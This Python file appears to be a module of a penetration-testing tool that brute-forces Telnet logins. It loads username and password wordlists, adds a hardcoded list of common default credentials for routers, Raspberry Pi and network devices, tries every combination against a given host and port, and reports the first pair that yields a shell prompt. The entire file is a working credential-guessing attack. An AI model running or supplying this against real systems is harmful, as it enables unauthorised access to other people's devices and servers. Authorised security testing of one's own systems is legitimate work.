import telnetlib
import socket
import time

def attempt_login(target, port, username, password, timeout=5):
	try:
		tn = telnetlib.Telnet(target, port, timeout=timeout)

		# Wait for login prompt
		tn.read_until(b"login:", timeout=timeout)
		tn.write(username.encode('ascii') + b"\n")

		# Wait for password prompt
		tn.read_until(b"Password:", timeout=timeout)
		tn.write(password.encode('ascii') + b"\n")

		# Read post-login response
		output = tn.read_until(b"$", timeout=timeout).decode("utf-8", errors="ignore")

		tn.close()

		if any(x in output.lower() for x in ["$", "#", "welcome", "last login", "you have mail"]):
			return True, output.strip()
		return False, None

	except (socket.timeout, ConnectionRefusedError, EOFError):
		return False, None
	except Exception as e:
		return False, str(e)

def run(target, port, userlist_path="wordlists/port_users.txt", passlist_path="wordlists/port_pw.txt", delay=0.2):

	try:
		with open(userlist_path, "r") as uf:
			usernames = [u.strip() for u in uf.readlines()]
		with open(passlist_path, "r") as pf:
			passwords = [p.strip() for p in pf.readlines()]
	except FileNotFoundError as e:
		return {"error": f"File not found: {e.filename}", "success": False}


	common_usernames = ["admin", "root", "user", "guest", "default", "system", "operator", "service", "support", "manager", "sysadmin", "test", "administrator", "pi", "ubnt", "cisco"]
	common_passwords = ["admin", "password", "1234", "12345", "123456", "root", "toor", "default", "guest", "pass", "system", "service", "support", "letmein", "manager", "123", "12345678", "qwerty", "abc123", "password1"]
	for cun in common_usernames:
		if cun not in usernames:
			usernames.append(cun)
	for cpw in common_passwords:
		if cpw not in passwords:
			passwords.append(cpw)



	for username in usernames:
		for password in passwords:
			success, result = attempt_login(target, port, username, password)
			if success:
				return {
					"success": True,
					"username": username,
					"password": password,
					"response": result
				}
			time.sleep(delay)

	return {
		"success": False,
		"error": "No valid credentials found."
	}
